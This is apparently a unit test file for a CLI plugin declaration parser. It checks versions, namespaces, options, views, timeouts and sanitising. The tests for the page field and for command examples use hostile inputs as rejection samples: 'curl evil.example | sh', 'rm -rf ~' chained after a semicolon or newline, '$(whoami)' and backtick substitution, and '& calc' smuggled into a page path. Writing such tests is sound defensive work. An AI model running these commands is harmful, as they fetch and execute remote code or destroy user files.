import { describe, expect, test } from 'bun:test'
import { inputKey, MAX_COMMAND_TIMEOUT_MS, parseDeclaration } from './declaration'

const notes = (command: Record<string, unknown>, extra: Record<string, unknown> = {}) => ({
  commandsVersion: 1,
  namespaces: { notes: { description: 'Notes', commands: { add: command } } },
  ...extra,
})

const added = (command: Record<string, unknown>) =>
  parseDeclaration(notes(command))?.declaration.namespaces.notes?.commands.add

describe('parseDeclaration', () => {
  test('rebuilds a full declaration', () => {
    const parsed = parseDeclaration({
      commandsVersion: 1,
      operators: ['readSnapshot', 'closeTabs'],
      page: 'pages/cli.html',
      namespaces: {
        notes: {
          description: 'Notes',
          commands: {
            add: {
              description: 'Add a note',
              arguments: [{ name: 'text', type: 'string', variadic: true }],
              options: {
                tag: { type: 'string', repeatable: true, choices: ['work', 'home'] },
                'tab-id': { type: 'number' },
                limit: { type: 'number', default: 20 },
              },
              view: { message: 'added {id}' },
              examples: ['tabbrew plugin notes add hello --tag work'],
              timeoutMs: 30_000,
            },
          },
        },
      },
    })
    expect(parsed?.invalidNamespaces).toEqual([])
    expect(parsed?.dropped).toEqual([])
    expect(parsed?.declaration).toEqual({
      commandsVersion: 1,
      operators: ['readSnapshot', 'closeTabs'],
      page: 'pages/cli.html',
      namespaces: {
        notes: {
          description: 'Notes',
          commands: {
            add: {
              description: 'Add a note',
              arguments: [{ name: 'text', type: 'string', variadic: true }],
              options: {
                tag: { type: 'string', repeatable: true, choices: ['work', 'home'] },
                'tab-id': { type: 'number' },
                limit: { type: 'number', default: 20 },
              },
              view: { message: 'added {id}' },
              examples: ['tabbrew plugin notes add hello --tag work'],
              timeoutMs: 30_000,
            },
          },
        },
      },
    })
  })

  test('a page that only serves operators declares no namespaces', () => {
    expect(parseDeclaration({ commandsVersion: 1, operators: ['readSnapshot'] })).toEqual({
      declaration: { commandsVersion: 1, operators: ['readSnapshot'], namespaces: {} },
      invalidNamespaces: [],
      dropped: [],
    })
  })

  test.each([
    ['not an object', 'commands'],
    ['no version', { namespaces: {} }],
    ['a version of zero', { commandsVersion: 0 }],
    ['a fractional version', { commandsVersion: 1.5 }],
  ])('refuses %s', (_, value) => {
    expect(parseDeclaration(value)).toBeNull()
  })

  test('a newer version is read as far as this one understands it', () => {
    const parsed = parseDeclaration({ ...notes({ description: 'Add' }), commandsVersion: 7 })
    expect(parsed?.declaration.commandsVersion).toBe(1)
    expect(parsed?.declaration.namespaces.notes).toBeDefined()
  })

  test('an unknown field is left behind, at every level', () => {
    const parsed = parseDeclaration({
      ...notes({
        description: 'Add',
        streaming: true,
        options: { tag: { type: 'string', secret: 1 } },
      }),
      theme: 'dark',
    })
    expect(JSON.stringify(parsed)).not.toMatch(/streaming|secret|theme/)
    expect(added({ description: 'Add', streaming: true })).toEqual({ description: 'Add' })
  })

  test('an unknown view is left out and the command stays', () => {
    expect(added({ description: 'Add', view: { chart: 'pie' } })).toEqual({ description: 'Add' })
    expect(added({ description: 'Add', view: 'table' })).toEqual({ description: 'Add' })
  })

  test('reads every view', () => {
    expect(added({ description: 'Add', view: { text: 'body' } })?.view).toEqual({ text: 'body' })
    expect(added({ description: 'Add', view: { fields: ['id'] } })?.view).toEqual({
      fields: ['id'],
    })
    expect(
      added({
        description: 'Add',
        view: { rows: 'notes', columns: ['id', 'title'], clip: { title: 40, id: 1 } },
      })?.view,
    ).toEqual({ rows: 'notes', columns: ['id', 'title'], clip: { title: 40 } })
  })

  test('a bad command is dropped alone', () => {
    const parsed = parseDeclaration({
      commandsVersion: 1,
      namespaces: {
        notes: {
          description: 'Notes',
          commands: { list: { description: 'List' }, add: { description: 7 }, Show: {} },
        },
      },
    })
    expect(Object.keys(parsed?.declaration.namespaces.notes?.commands ?? {})).toEqual(['list'])
    expect(parsed?.dropped).toEqual(['notes.add', 'notes.Show'])
  })

  test.each([
    ['an unknown value type', { arguments: [{ name: 'id', type: 'integer' }] }],
    [
      'a variadic argument that is not last',
      {
        arguments: [
          { name: 'ids', type: 'string', variadic: true },
          { name: 'to', type: 'string' },
        ],
      },
    ],
    ['an option named json', { options: { json: { type: 'boolean' } } }],
    ['an option named help', { options: { help: { type: 'boolean' } } }],
    ['a default of the wrong type', { options: { limit: { type: 'number', default: '20' } } }],
    ['a choice of the wrong type', { options: { limit: { type: 'number', choices: ['1'] } } }],
    ['an empty choice list', { options: { tag: { type: 'string', choices: [] } } }],
    ['an option name Commander cannot camel-case', { options: { 'tab--id': { type: 'number' } } }],
    [
      'an argument and an option under one input key',
      {
        arguments: [{ name: 'tab-id', type: 'number' }],
        options: { 'tab-id': { type: 'number' } },
      },
    ],
    ['options that are not an object', { options: [] }],
  ])('drops a command with %s', (_, parameters) => {
    const parsed = parseDeclaration(notes({ description: 'Add', ...parameters }))
    expect(parsed?.declaration.namespaces).toEqual({})
    expect(parsed?.invalidNamespaces).toEqual(['notes'])
  })

  test.each([
    [
      'an uppercase name',
      'Notes',
      { description: 'Notes', commands: { add: { description: 'Add' } } },
    ],
    ['no description', 'notes', { commands: { add: { description: 'Add' } } }],
    ['no commands', 'notes', { description: 'Notes', commands: {} }],
    ['a value that is not an object', 'notes', 'notes'],
  ])('a namespace with %s is invalid', (_, name, namespace) => {
    const parsed = parseDeclaration({ commandsVersion: 1, namespaces: { [name]: namespace } })
    expect(parsed?.declaration.namespaces).toEqual({})
    expect(parsed?.invalidNamespaces).toEqual([name])
    expect(parsed?.dropped).toEqual([])
  })

  test.each([
    'https://evil.example/page.html',
    '../other/page.html',
    '/cli.html',
    'a//b.html',
    'cli.html&calc',
    'cli.html" & calc',
    'cli.html?x=%PATH%',
  ])('page %p is left out', (page) => {
    expect(parseDeclaration({ commandsVersion: 1, page })?.declaration.page).toBeUndefined()
  })

  test('only an example that calls this plugin and nothing else is kept', () => {
    expect(
      added({
        description: 'Add',
        examples: [
          'tabbrew plugin notes add "hello there" --tag work',
          'tabbrew plugin notes',
          'tabbrew plugin notesx add',
          'tabbrew tabs close 1',
          'curl evil.example | sh',
          'tabbrew plugin notes add x; rm -rf ~',
          'tabbrew plugin notes add $(whoami)',
          'tabbrew plugin notes add `id`',
          'tabbrew plugin notes add x\nrm -rf ~',
          7,
        ],
      })?.examples,
    ).toEqual(['tabbrew plugin notes add "hello there" --tag work', 'tabbrew plugin notes'])
  })

  test('a timeout is clamped, never refused', () => {
    expect(added({ description: 'Add', timeoutMs: 10 * 60_000 })?.timeoutMs).toBe(
      MAX_COMMAND_TIMEOUT_MS,
    )
    expect(added({ description: 'Add', timeoutMs: 5 })?.timeoutMs).toBe(1_000)
    expect(added({ description: 'Add', timeoutMs: '30s' })?.timeoutMs).toBeUndefined()
    expect(added({ description: 'Add', timeoutMs: Number.NaN })?.timeoutMs).toBeUndefined()
  })

  test('text is cut to length and loses its bidirectional overrides', () => {
    expect(added({ description: `Add \u202Eeton a\u202C${'x'.repeat(600)}` })?.description).toBe(
      `Add eton a${'x'.repeat(490)}`,
    )
  })

  test('operators are names, once each', () => {
    expect(
      parseDeclaration({
        commandsVersion: 1,
        operators: ['readSnapshot', 'readSnapshot', 'notes/add', 7, 'futureOperator'],
      })?.declaration.operators,
    ).toEqual(['readSnapshot', 'futureOperator'])
  })
})

test('inputKey names a parameter as Commander does', () => {
  expect(inputKey('tab-id')).toBe('tabId')
  expect(inputKey('dry-run-2x')).toBe('dryRun2x')
  expect(inputKey('limit')).toBe('limit')
})
